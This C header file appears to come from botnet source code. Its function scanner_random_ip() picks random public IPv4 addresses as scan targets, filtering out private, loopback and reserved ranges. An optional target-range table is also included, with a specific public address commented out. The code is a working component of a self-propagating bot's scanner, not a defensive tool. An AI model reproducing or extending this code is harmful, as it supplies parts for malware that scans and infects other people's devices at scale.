#ifndef IP_LIST_H
#define IP_LIST_H

#include "bot/endianness.h"
#include "bot/utils/xoshiro.h"
#include <netinet/in.h>
#include <stdint.h>

#define IP_RANGE_COUNT 0

/* info on ip ranges */
typedef struct {
  uint32_t ip;
  uint8_t mask;
} ip_range_t, *pip_range_t;

/* the ranges */
static ip_range_t ranges[IP_RANGE_COUNT] = {
 //  {INET_ADDR(216,170,241,30), 32},
  // {INET_ADDR(127,0,0,1), 32},
};

/* generates a random ip */
static inline uint32_t scanner_random_ip(void) {
#if IP_RANGE_COUNT == 0
  uint32_t tmp;
  uint8_t o1, o2, o3, o4;

  do {
    tmp = xoshiro_next();
    o1 = tmp & 0xff;
    o2 = (tmp >> 8) & 0xff;
    o3 = (tmp >> 16) & 0xff;
    o4 = (tmp >> 24) & 0xff;
  } while (o1 == 127 ||                           // 127.0.0.0/8      - Loopback
           o1 == 0 ||                             // 0.0.0.0/8        - Invalid address space
           o1 == 10 ||                            // 10.0.0.0/8       - Internal network
           (o1 == 192 && o2 == 168) ||            // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||  // 172.16.0.0/12    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) || // 100.64.0.0/10    - Carrier-grade NAT
           (o1 == 169 && o2 == 254) ||            // 169.254.0.0/16   - Link-local
           (o1 == 198 && o2 >= 18 && o2 < 20) ||  // 198.18.0.0/15    - Benchmarking
           (o1 >= 224)); // Multicast and reserved

  return INET_ADDR(o1, o2, o3, o4);
#else
  pip_range_t range = &ranges[xoshiro_next() % IP_RANGE_COUNT];

  if (range->mask == 32) {
    return range->ip;
  }

  uint32_t bits = 32 - range->mask;
  uint32_t rand_offset = bits == 32 ? 0 : (xoshiro_next() & ((1UL << bits) - 1));
  uint32_t ip = ntohl(range->ip) | rand_offset;

  return htonl(ip);
#endif
}

#endif
